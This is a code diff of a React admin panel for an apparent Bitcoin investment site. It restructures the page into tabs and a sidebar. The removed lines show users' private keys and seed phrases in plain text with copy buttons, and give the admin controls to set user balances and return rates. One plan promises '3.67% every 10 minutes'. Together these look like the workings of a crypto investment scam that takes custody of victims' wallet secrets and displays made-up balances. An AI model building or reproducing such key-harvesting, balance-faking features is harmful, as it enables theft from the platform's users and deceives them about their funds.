-                        type="number"
-                        step="0.0001"
-                        defaultValue={(parseFloat(plan.dailyReturnRate) * 100).toFixed(4)}
-                        placeholder="0.0000"
-                        className="mt-1"
-                        onBlur={(e) => {
-                          const newRate = (parseFloat(e.target.value) / 100).toString();
-                          if (newRate && newRate !== plan.dailyReturnRate) {
-                            updatePlanRateMutation.mutate({
-                              planId: plan.id,
-                              dailyReturnRate: newRate
-                            });
-                          }
-                        }}
-                      />
-                    </div>
-                  </div>
-                </div>
-              ))}
-            </div>
-          </CardContent>
-        </Card>
+  const renderTabContent = () => {
+    switch (activeTab) {
+      case "overview":
+        return renderOverviewTab();
+      case "users":
+        return renderUsersTab();
+      case "plans":
+        return renderPlansTab();
+      case "transactions":
+        return renderTransactionsTab();
+      case "security":
+        return renderSecurityTab();
+      case "config":
+        return renderConfigTab();
+      default:
+        return renderOverviewTab();
+    }
+  };
 
-        {/* User Management */}
-        <Card className="dark-card dark-border">
-          <CardHeader>
-            <CardTitle className="text-foreground">User Management</CardTitle>
-          </CardHeader>
-          <CardContent className="p-0">
-            <div className="overflow-x-auto">
-              <Table>
-                <TableHeader>
-                  <TableRow>
-                    <TableHead className="text-muted-foreground">Email</TableHead>
-                    <TableHead className="text-muted-foreground">Balance</TableHead>
-                    <TableHead className="text-muted-foreground">Investment Plan</TableHead>
-                    <TableHead className="text-muted-foreground">Private Key</TableHead>
-                      <TableHead>Seed Phrase</TableHead>
-                    <TableHead>Actions</TableHead>
-                    </TableRow>
-                </TableHeader>
-                <TableBody>
-                  {users?.map((user) => {
-                    const userPlan = investmentPlans?.find(plan => plan.id === user.currentPlanId);
-                    return (
-                      <TableRow key={user.id}>
-                      <TableCell className="text-foreground">{user.email}</TableCell>
-                      <TableCell className="text-bitcoin">{formatBitcoin(user.balance)} BTC</TableCell>
-                      <TableCell className="text-foreground">
-                        {userPlan ? (
-                          <span className="px-2 py-1 rounded text-xs" style={{ backgroundColor: userPlan.color + '20', color: userPlan.color }}>
-                            {userPlan.name}
-                          </span>
-                        ) : (
-                          <span className="text-muted-foreground text-xs">Free Plan</span>
-                        )}
-                      </TableCell>
-                      <TableCell>
-                       {showPrivateKeys[user.id] ? (
-                          <div className="flex items-center gap-2">
-                            <Input
-                              type="text"
-                              value={userPrivateKeys[user.id] || ""}
-                              readOnly
-                              className="bg-muted text-xs"
-                            />
-                            <Button
-                              size="sm"
-                              onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
-                              className="bg-green-500 hover:bg-green-500/90 text-black"
-                            >
-                              Copy
-                            </Button>
-                          </div>
-                        ) : (
-                          <Button
-                            size="sm"
-                            onClick={() => togglePrivateKey(user.id)}
-                            className="bg-blue-500 hover:bg-blue-500/90 text-black"
-                          >
-                            Show
-                          </Button>
-                        )}
-                      </TableCell>
-                      <TableCell className="text-foreground">
-                        {user.seedPhrase ? (
-                          <span className="text-xs">{user.seedPhrase}</span>
-                        ) : (
-                          <span className="text-muted-foreground text-xs">No Seed Phrase</span>
-                        )}
-                      </TableCell>
-                      <TableCell>
-                        <div className="flex gap-1">
-                          <Button
-                            size="sm"
-                            onClick={() => handleUpdateBalance(user)}
-                            className="bg-bitcoin hover:bg-bitcoin/90 text-black"
-                          >
-                            <Edit className="w-3 h-3" />
-                          </Button>
-                          <Button
-                            size="sm"
-                            onClick={() => handleUpdatePlan(user)}
-                            variant="outline"
-                            className="border-muted"
-                          >
-                            <Settings className="w-3 h-3" />
-                          </Button>
-                        </div>
-                      </TableCell>
-                      </TableRow>
-                    );
-                  })}
-                </TableBody>
-              </Table>
-            </div>
-          </CardContent>
-        </Card>
+  return (
+    <div className="min-h-screen bg-gray-50">
+      {/* Sidebar */}
+      {renderSidebar()}
 
-        {/* User Private Keys Management */}
-        <Card className="dark-card dark-border">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <Key className="w-5 h-5" />
-              User Private Keys (Admin Only)
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              {users?.map((user) => (
-                <div key={user.id} className="border rounded-lg p-4 space-y-2">
-                  <div className="flex justify-between items-start">
-                    <div>
-                      <p className="font-medium text-foreground">{user.email}</p>
-                      <p className="text-sm text-muted-foreground">User ID: {user.id}</p>
-                    </div>
-                    <Button
-                      size="sm"
-                      variant="outline"
-                      onClick={() => {
-                        navigator.clipboard.writeText(user.privateKey || '');
-                        toast({
-                          title: "Copied",
-                          description: "Private key copied to clipboard",
-                        });
-                      }}
-                    >
-                      <Copy className="w-3 h-3 mr-1" />
-                      Copy Private Key
-                    </Button>
-                  </div>
-                  <div className="space-y-1">
-                    <p className="text-xs font-medium text-muted-foreground">Bitcoin Address:</p>
-                    <p className="text-xs font-mono bg-muted p-2 rounded break-all">{user.bitcoinAddress}</p>
-                  </div>
-                  <div className="space-y-1">
-                    <p className="text-xs font-medium text-muted-foreground">Private Key:</p>
-                    <p className="text-xs font-mono bg-muted p-2 rounded break-all text-red-500">
-                      {user.privateKey || 'No private key available'}
-                    </p>
-                  </div>
-                </div>
-              ))}
+      {/* Sidebar Overlay */}
+      {sidebarOpen && (
+        <div
+          className="fixed inset-0 bg-black bg-opacity-50 z-40 lg:hidden"
+          onClick={() => setSidebarOpen(false)}
+        />
+      )}
+
+      {/* Main Content */}
+      <div className="lg:ml-64">
+        {/* Top Header */}
+        <header className="bg-white border-b border-gray-200 px-6 py-4">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-4">
+              <Button
+                variant="ghost"
+                size="icon"
+                onClick={() => setSidebarOpen(true)}
+                className="lg:hidden"
+              >
+                <Menu className="w-5 h-5" />
+              </Button>
+              <div>
+                <h1 className="text-2xl font-bold text-gray-900">
+                  {navigationItems.find(item => item.id === activeTab)?.label || "Overview"}
+                </h1>
+                <p className="text-sm text-gray-500">
+                  {currentTime.toLocaleDateString()} • {currentTime.toLocaleTimeString()}
+                </p>
+              </div>
             </div>
-          </CardContent>
-        </Card>
+            <div className="flex items-center gap-3">
+              <Badge variant="secondary" className="bg-green-100 text-green-800">
+                <Activity className="w-3 h-3 mr-1" />
+                Online
+              </Badge>
+              <div className="text-right">
+                <p className="text-sm font-medium">{user?.email}</p>
+                <p className="text-xs text-gray-500">Administrator</p>
+              </div>
+            </div>
+          </div>
+        </header>
+
+        {/* Main Content Area */}
+        <main className="p-6">
+          {renderTabContent()}
+        </main>
       </div>
 
-      {/* Update Balance Dialog */}
+      {/* Dialogs */}
       <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
-        <DialogContent className="dark-card dark-border">
+        <DialogContent>
           <DialogHeader>
-            <DialogTitle className="text-foreground">Update User Balance</DialogTitle>
+            <DialogTitle>Update User Balance</DialogTitle>
           </DialogHeader>
           <div className="space-y-4">
             <div>
@@ -868,11 +1130,10 @@ export default function Management() {
         </DialogContent>
       </Dialog>
 
-      {/* Update Plan Dialog */}
       <Dialog open={planDialogOpen} onOpenChange={setPlanDialogOpen}>
-        <DialogContent className="dark-card dark-border">
+        <DialogContent>
           <DialogHeader>
-            <DialogTitle className="text-foreground">Update Investment Plan</DialogTitle>
+            <DialogTitle>Update Investment Plan</DialogTitle>
           </DialogHeader>
           <div className="space-y-4">
             <div>
@@ -891,8 +1152,8 @@ export default function Management() {
                   <SelectValue placeholder="Select a plan" />
                 </SelectTrigger>
                 <SelectContent>
-                  <SelectItem value="0">Free Plan (3.67% every 10 minutes)</SelectItem>
-                  {investmentPlans?.filter(plan => plan.id && plan.id.toString().trim() !== '').map((plan) => (
+                  <SelectItem value="0">Free Plan</SelectItem>
+                  {investmentPlans?.map((plan) => (
                     <SelectItem key={plan.id} value={plan.id.toString()}>
                       {plan.name} - {(parseFloat(plan.dailyReturnRate) * 100).toFixed(2)}% daily
                     </SelectItem>
@@ -916,11 +1177,13 @@ export default function Management() {
         </DialogContent>
       </Dialog>
 
-      {/* Bottom spacing for navigation */}
-      <div className="h-20"></div>
+      {/* Bottom spacing for mobile navigation */}
+      <div className="h-20 lg:hidden"></div>
 
-      {/* Bottom Navigation */}
-      <BottomNavigation />
+      {/* Bottom Navigation for mobile */}
+      <div className="lg:hidden">
+        <BottomNavigation />
+      </div>
     </div>
   );
 }
